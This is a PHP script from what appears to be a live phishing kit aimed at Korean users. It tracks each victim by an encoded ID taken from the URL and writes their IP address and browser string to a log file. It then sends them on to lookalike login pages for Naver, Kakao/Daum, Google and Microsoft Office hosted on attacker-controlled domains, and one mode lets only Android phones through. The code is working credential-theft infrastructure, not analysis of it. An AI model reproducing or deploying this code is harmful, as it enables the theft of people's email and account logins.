<?php 
$_mode = '';
$ecoded_id ='';
$rtn_url = 'https://mail.naver.com';
     if (isset($_SERVER['REQUEST_URI']))
     {
	   $_url = $_SERVER['REQUEST_URI'];
	   $pos10 = strpos($_url, "&rtnurl=");
	   if ($pos10 == 0) 
	   {
	   	$rtn_url = '';
	   	$pos10 = strlen($_url);
	   }
	   else 
	   {
	   	$rtn_url = substr($_url,$pos10+8,strlen($_url)-$pos10-8);
	   }
	   $pos = strpos($_url, "&recid=");
	   if ($pos == 0) 
	   {
	   	$_mode = '';
	   	$pos = strlen($_url);
	   }
	   else 
	   {
	   	$_mode = substr($_url,$pos+7,$pos10 - $pos-7);
	   }
	   
	$pos1 = strpos($_url, "fnamei=");
	if ($pos1 == 0) $ecoded_id = '';
	else 
	{
		
		$ecoded_id = substr($_url,$pos1+7,$pos-$pos1-7);
	}
	$pos2 = strpos($_url, "useeid=");
	if ($pos2 != 0) 
	{
		
		$ecoded_id = substr($_url,$pos2+7,$pos-$pos2-7);
	}

   }
	//if($_GET['email'] == ''){ header('Location: https://mail.naver.com');exit;}
	$ip = getenv ("REMOTE_ADDR");
	$date=date("F j, Y, g:i a");
		//$ecoded_id=$_GET['email'];
		$fname = sprintf("%s.txt",$_mode.'_'.base64_decode($ecoded_id));
		$handle = fopen($fname, "a+");
		fwrite($handle, $_SERVER['HTTP_USER_AGENT']);
		fwrite($handle, "\r\n");
		fwrite($handle, $ip);
		fwrite($handle, "\r\n");
		fwrite($handle, "-----------------------");
		fclose($handle);
		if($_mode=='nc'){
			$_go_url = "http://www.lkh.co.kr/eng/data/nc/?menu=".$ecoded_id."&q=https%3A%2F%2Fnid.naver.com%2Fnidlogin.login%3Fmode%3Dform%26url%3Dhttps%3A%2F%2Fwww.naver.com%2F&rtnurl=".$rtn_url;
		}
		if($_mode=='kl'){
			$_go_url = "http://www.lkh.co.kr/eng/data/kl/?menu=".$ecoded_id."&q=https%3A%2F%2Faccounts.kakao.com%2Flogin%2F%3Fcontinue%3Dhttps%253A%252F%252Flogins.daum.net%252Faccounts%252Fksso.do%253Frescue%253Dtrue%2526url%253Dhttps%25253A%25252F%25252Flogins.daum.net%25252Faccounts%25252Fksso.do%25253Frescue%25253Dtrue%252526url%25253Dhttps%2525253A%2525252F%2525252Fmail.daum.net%23login";
		}
		if($_mode=='nl'){
			$_go_url = "http://www.lkh.co.kr/eng/data/nl/?menu=".$ecoded_id."&q=https%3A%2F%2Fnid.naver.com%2Fnidlogin.login%3Fmode%3Dform%26url%3Dhttps%3A%2F%2Fwww.naver.com%2F&rtnurl=".$rtn_url;
		}
		if($_mode=='gl'){
			$_go_url = base64_decode($rtn_url);
			//$_go_url = "https://binaces.homes/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=ATuJsjzB9m75tJYKfmocXc1P50wYjxhGSpAVtFwStfHK1gtgJhFS4Daby4eNKj-aJTQs4M2qw1626w&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S620935820%3A1708323982878302&theme=glif&otp=&rtnurl=".$rtn_url;
		}
		if($_mode=='al'){
			if(stristr($_SERVER['HTTP_USER_AGENT'],"Android")){
				$_go_url = base64_decode($rtn_url);
			}
			else {
				echo "휴대폰에서 접속해주세요.";
				exit;
			}
			
		}
		if($_mode=='hl'){
			$_go_url = "https://loginshmil.nainenc.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638052334139061911.NmQ0NGJhZTctYTdlZS00MTc1LWI3NDUtODgzNmM2NGQzN2U3MGYxMTQ4OTctYzkzZS00ZGQ4LTlhZGEtODQzYzExZDg1NmFm&ui_locales=ko-KR&mkt=ko-KR&state=_hCyYbcaoVwNsfJxbctPjqf7qq5a-C4ULd2qqdXhYeWilY_LODP3-r5CxuGGTtRvvXiIJzfc6jzviRw0v8ILxBVHiJ_DCpPOMZQ-odlYor1GkigvFjozBseSbYtvscnMZnSNaMntxOLTCI5tguIFW0aB3m66QPukyxkB1UqsDK_FkMi2OaTjTtHSVe7AYIA5IVLoIq5hkuh8_w73fMupt0fsXdPbhbnxmOhQUubvAJ6e7oc81mfGIGupzUKFW7SQFIUqFSWkcgRSVFvZT3rJ0g&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0&otp=".$ecoded_id."&rtnurl=aHR0cDovL3BuYmJpby5jb20vZ251Ym9hcmQ0L2FkbS9pbWcvZGF0YS9EZXRhaWwuZG9j
";
		}
		if($_mode==''){
		 $_go_url = "https://kasdman.xyz/ncf/?btoken=".$ecoded_id;
		}
		
		
		header('Location: '.$_go_url);
		exit;
?>